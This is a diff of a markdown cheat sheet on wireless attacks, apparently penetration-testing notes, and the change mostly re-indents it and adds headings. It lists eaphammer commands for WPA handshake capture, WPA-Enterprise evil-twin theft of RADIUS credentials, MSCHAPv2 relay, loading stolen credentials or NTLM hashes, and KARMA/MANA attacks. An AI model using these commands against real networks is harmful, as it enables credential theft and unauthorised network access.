@@ -14,11 +14,11 @@
 			Capture WPA (half) Handshake of connecting clients & Cracking  
 				eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase randompassphrase --capture-wpa-handhshake  
 ##	WPA/WPA2-Enterprise Evil Twin  
-		RADIUS Credentials Unknown  
-			RADIUS Credentials Stealing  
-				eaphammer --cert-wizard  
-                eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID> --creds  
-				Possible if:  
+###		RADIUS Credentials Unknown  
+####			RADIUS Credentials Stealing  
+			eaphammer --cert-wizard  
+	                eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID> --creds  
+			Possible if:  
                     - EAP method does not use client-certificat for client authentication  
                     - Server certificate validation not enforced on client  
 			EAP (MSCHAPv2) Relay  
@@ -27,11 +27,12 @@
 				Possible if:  
                     - Target network uses EAP method with MSCHAPv2 for client authentication  
                     - Server certificate validation not enforced on client  
-		RADIUS Credentials Known  
+###		RADIUS Credentials Known  
 			ehdb --add --identity <username> --password <password> # Add credentials in db  
-            ehdb --add --identity <username> --nt-hash <ntlm_hash>  # Add creds with NTLM hash in db  
-            eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap  --essid <SSID_corporate_wifi>  
-	802.11 Network Selection Algorithms Abuse (for Open Network)  
+   		         ehdb --add --identity <username> --nt-hash <ntlm_hash>  # Add creds with NTLM hash in db  
+		            eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap  --essid <SSID_corporate_wifi>  
+
+###	802.11 Network Selection Algorithms Abuse (for Open Network)  
 		KARMA Attack (outdated)  
 			By default with wifiphisher  
 		MANA Attack (KARMA improvement)  
